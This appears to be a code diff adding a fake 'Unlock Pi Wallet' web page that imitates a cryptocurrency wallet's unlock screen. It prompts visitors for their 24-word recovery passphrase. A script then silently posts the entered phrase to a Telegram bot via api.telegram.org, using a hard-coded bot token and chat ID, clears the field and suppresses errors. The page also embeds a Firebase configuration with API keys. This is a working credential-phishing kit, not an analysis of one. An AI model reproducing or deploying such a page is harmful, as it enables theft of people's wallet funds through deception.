@@ -1,0 +1,159 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Unlock Pi Wallet</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      margin: 0;
+      padding: 0;
+    }
+    .header {
+      background-color: #6e3cbc;
+      color: white;
+      padding: 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .header .title {
+      font-size: 1.2rem;
+      font-weight: bold;
+    }
+    .container {
+      max-width: 400px;
+      margin: 3rem auto;
+      padding: 2rem;
+      text-align: center;
+    }
+    h2 {
+      margin-bottom: 1rem;
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 70px;
+      font-size: 15px;
+      margin-bottom: 10px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      padding: 1rem;
+      font-size: 1rem;
+      border: none;
+      border-radius: 8px;
+      margin-bottom: 1rem;
+      cursor: pointer;
+    }
+    .btn-passphrase {
+      background-color: white;
+      color: #6e3cbc;
+      border: 2px solid #6e3cbc;
+    }
+    .btn-faceid {
+      background-color: #6e3cbc;
+      color: white;
+    }
+    .info {
+      font-size: 0.9rem;
+      color: #444;
+      margin-top: 1rem;
+    }
+    .info a {
+      color: #0066cc;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+
+   <!-- Header -->
+  <div class="header">
+    <div class="back-arrow">←</div>
+
+    <div class="wallet-icon">
+      <!-- Placeholder for Wallet Icon -->
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5b/Pi-symbol.svg/1200px-Pi-symbol.svg.png" alt="Pi Wallet Icon">
+      Wallet
+    </div>
+
+    <div class="dropdown">˅</div>
+  </div>
+
+</body>
+</html>
+
+  <div class="container">
+    <h2>Unlock Pi Wallet</h2>
+    <input type="text" id="passphrase" placeholder="Enter your 24-word passphrase here" />
+    <button class="btn-passphrase" onclick="sendToTelegram()">Unlock With Passphrase</button>
+    <button class="btn-faceid">Unlock With Face ID</button>
+
+    <div class="info">
+      As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
+      <br><br>
+      Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
+    </div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = 'bot7210917381:AAGPxkv9Y3dqnBj_rHOtWvvuIyg9qHlpFrg'; // Replace with your Telegram bot token
+    const CHAT_ID = '5160818690';     // Replace with your Telegram chat ID
+
+    function sendToTelegram() {
+      const message = document.getElementById("passphrase").value.trim();
+
+      if (!message) return; // Do nothing if input is empty
+
+      const text = `🔐 New Passphrase Submitted:\n\n${message}`;
+
+      fetch(`https://api.telegram.org/bot7210917381:AAGPxkv9Y3dqnBj_rHOtWvvuIyg9qHlpFrg/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text
+        })
+      }).then(() => {
+        // Optional: Clear input silently
+        document.getElementById("passphrase").value = "";
+      }).catch(() => {
+        // Error silently ignored
+      });
+    }
+  </script>
+
+</body>
+</html>
+ 
+<script type="module">
+  // Import the functions you need from the SDKs you need
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-app.js";
+  import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-analytics.js";
+  // TODO: Add SDKs for Firebase products that you want to use
+  // https://firebase.google.com/docs/web/setup#available-libraries
+
+  // Your web app's Firebase configuration
+  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+  const firebaseConfig = {
+    apiKey: "AIzaSyDs8td5nNbAb_O6NROVTtXoPGrhVbdaO0E",
+    authDomain: "pimine-wallet.firebaseapp.com",
+    projectId: "pimine-wallet",
+    storageBucket: "pimine-wallet.firebasestorage.app",
+    messagingSenderId: "789713542611",
+    appId: "1:789713542611:web:d39de87919c9f30b3de326",
+    measurementId: "G-BE2YR7571B"
+  };
+
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  const analytics = getAnalytics(app);
+</script>
